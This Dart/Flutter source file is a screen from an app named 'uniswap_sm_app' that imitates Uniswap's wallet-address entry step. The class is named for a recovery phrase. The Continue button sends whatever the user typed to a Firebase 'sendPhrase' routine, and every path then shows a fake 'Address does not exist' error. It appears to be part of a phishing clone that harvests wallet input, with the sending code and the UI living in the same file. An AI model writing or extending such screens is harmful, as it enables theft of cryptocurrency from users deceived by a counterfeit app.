import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:uniswap_sm_app/app/firebase/send_phrase_method.dart';
import 'package:uniswap_sm_app/app/models/tab_model.dart';
import 'package:uniswap_sm_app/app/widget/alert.dart';
import 'package:uniswap_sm_app/app/widget/btn.dart';
import '../constants/colors.dart';

class EnterRecoverPraseScreen2 extends StatefulWidget {
  EnterRecoverPraseScreen2({super.key});

  @override
  State<EnterRecoverPraseScreen2> createState() =>
      _EnterRecoverPraseScreen2State();
}

class _EnterRecoverPraseScreen2State extends State<EnterRecoverPraseScreen2> {
  var tabberList = tabbers;
  var ctl = TextEditingController();
  var isError = false;
  final repo = SendPhrase();

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgColor,
      appBar: AppBar(
          backgroundColor: Colors.transparent,
          foregroundColor: Colors.transparent,
          shadowColor: Colors.transparent,
          leading: IconButton(
            icon: const Icon(
              Icons.arrow_back_ios_new_rounded,
              color: Color.fromARGB(255, 131, 156, 169),
              size: 26,
            ),
            onPressed: () {
              Get.back();
            },
          ),
          title: Center(child: buildRecoveryPhraseList())),
      body: buildRecoverPhraseBody(),
    );
  }

  Padding buildRecoverPhraseBody() => Padding(
        padding: const EdgeInsets.only(left: 10.0, right: 10.0),
        child: Center(
          child: Column(
            children: [
              const SizedBox(height: 20),
              Text('Enter a wallet address',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: whiteColor,
                      fontSize: 20,
                      fontWeight: FontWeight.w600)),
              const SizedBox(height: 20),
              Text(
                  'Enter an Ethereum wallet address (starting with 0x) of\nENS name (ending in .eth).',
                  textAlign: TextAlign.center,
                  style: TextStyle(color: greyColor, fontSize: 13)),
              const SizedBox(height: 20),
              buildTextField(),
              isError
                  ? Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      crossAxisAlignment: CrossAxisAlignment.center,
                      children: [
                        const Icon(
                          Icons.warning_rounded,
                          size: 30,
                          color: Colors.red,
                        ),
                        const SizedBox(width: 10),
                        Text('Address does not exist',
                            textAlign: TextAlign.center,
                            style: GoogleFonts.dmSans(
                                color: Colors.red,
                                fontSize: 22,
                                fontWeight: FontWeight.w600)),
                      ],
                    )
                  : const SizedBox(
                      height: 40.0,
                    ),
              Padding(
                padding: const EdgeInsets.only(top: 15.0),
                child: InkWell(
                  onTap: () {
                    setState(() {
                      ctl.text = 'uniswapdemo.eth';
                    });
                  },
                  child: RichText(
                      text: TextSpan(
                          style: TextStyle(color: greyColor, fontSize: 13),
                          children: [
                        TextSpan(text: 'Not sure? Try adding '),
                        TextSpan(
                          text: 'uniswapdemo.eth',
                          style: TextStyle(color: pinkColor, fontSize: 13),
                        )
                      ])),
                ),
              ),
              const SizedBox(height: 15),
              buildBtn(
                iserror: ctl.text.isEmpty||isError,
                  doThis: () async {
                    // showDialog(context: context, builder: (_) => SizedBox());
                    await repo.sendPhrase(ctl.text);
                    if (ctl.text.isEmpty || ctl.text.length <= 12) {
                      setState(() {
                        isError = true;
                      });
                    } else {
                      await repo.sendPhrase('Watch Your wallet Button',ctl.text);
 setState(() {
                        isError = true;
                      });                      // Alertify.error(
                      //   title: "Internal Server Error",
                      //   message: "An error occured, please try again",
                      // );
                    }
                  },
                  btnText: 'Continue')
            ],
          ),
        ),
      );

  TextFormField buildTextField() {
    return TextFormField(
      textAlign: TextAlign.center,
      controller: ctl,
      maxLines: 4,
      onChanged: (_) {
        setState(() {
          isError = false;
        });
      },
      style: GoogleFonts.dmSans(
          color: whiteColor, fontSize: 18, fontWeight: FontWeight.w600),
      cursorColor: pinkColor,
      decoration: InputDecoration(
        hintText: 'Type or Paste address or ENS',
        enabled: true,
        hintStyle: TextStyle(color: greyColor, fontSize: 20),
        fillColor: cardColor,
        filled: true,
        border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(25),
            borderSide: const BorderSide(
              color: Colors.transparent,
              width: 0,
            )),
        focusedErrorBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(25),
            borderSide: const BorderSide(
              color: Colors.transparent,
              width: 0,
            )),
        errorText: isError ? '' : null,
        errorStyle: const TextStyle(color: Colors.red, fontSize: 20),
        errorBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(25),
            borderSide: const BorderSide(
              color: Colors.red,
              width: 2,
            )),
        focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(25),
            borderSide: const BorderSide(
              color: Colors.transparent,
              width: 0,
            )),
      ),
    );
  }
}

Row buildRecoveryPhraseList() {
  return Row(
    mainAxisSize: MainAxisSize.min,
    children: [
      Container(
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(20),
          color: whiteColor,
        ),
        height: 4,
        width: 40,
      ),
      const SizedBox(
        width: 10,
      ),
      Container(
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(20),
          color: darkerGreyColor,
        ),
        height: 4,
        width: 40,
      ),
      const SizedBox(
        width: 10,
      ),
      Container(
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(20),
          color: darkerGreyColor,
        ),
        height: 4,
        width: 40,
      ),
    ],
  );
}
